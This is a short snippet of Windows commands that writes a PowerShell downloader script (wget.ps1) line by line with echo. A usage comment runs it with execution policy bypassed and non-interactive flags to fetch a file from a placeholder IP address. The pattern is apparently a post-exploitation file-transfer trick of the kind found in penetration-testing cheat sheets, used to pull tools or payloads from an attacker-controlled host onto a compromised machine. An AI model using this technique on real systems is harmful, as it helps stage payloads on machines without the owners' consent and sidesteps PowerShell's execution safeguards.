echo $url = $args[0] > wget.ps1
echo $output = "$($pwd)\$($args[1])" >> wget.ps1
echo $wc = New-Object System.Net.WebClient >> wget.ps1
echo $wc.DownloadFile($url, $output) >> wget.ps1

#usage
#powershell.exe -ExecutionPolicy bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 http://x.x.x.x filename
